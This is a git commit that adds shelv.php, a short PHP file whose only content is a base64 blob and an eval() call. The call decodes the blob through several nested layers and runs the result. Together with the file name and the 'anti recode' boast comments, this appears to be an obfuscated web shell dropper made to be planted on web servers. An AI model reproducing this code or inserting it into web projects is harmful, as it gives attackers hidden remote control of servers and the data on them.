3389393fea5497985363e11a407e63dba7bb033e
Nii-sanHaxor <45889833+arifarhan16@users.noreply.github.com>
2019-04-27 00:16:15 +0700

    Create shelv.php

---
+++ shelv.php
@@ -0,0 +1,11 @@
+<?php 
+
+//100% Coded By Itsnii7w7_
+// Anti Recode 
+// Recode ? Hacker Kok Recode
+// Recode ? Bocah 
+// Thanks To : Allah Swt
+
+
+$code = 'BcFZgkMwAADQf7egJbZRhrbJWKsiVWJJF6Uk7n+KeY8eojV2b3av6eEFcNfwFqLpwXKbR7y3ZNElC3rJ+bM/uQPgLY0jbk3oKowVzXuJ0uadHzpsBX+9hXKgoleygDattLnrL7gqZM9s86KsWXdVmKNU358z5nV2KREzJZq9ulDV23sZcy8WIh0asLK1zUK8fKqRwud0hG9bydT8O+8hRNhQfx3/XnycwJDok1lVNj0U0tA2WPE8op53DxKYdnP++Pf0pAH56rcE7ooKHKNBOTEWmnrpafAg0SjhO833dZTQY/fGpAFFuutFeJa12zeyogUSmsGwHKs6z2uPlrYYiBgXx5u4JG/utkmb9A8=';
+eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode($code)))))));?>
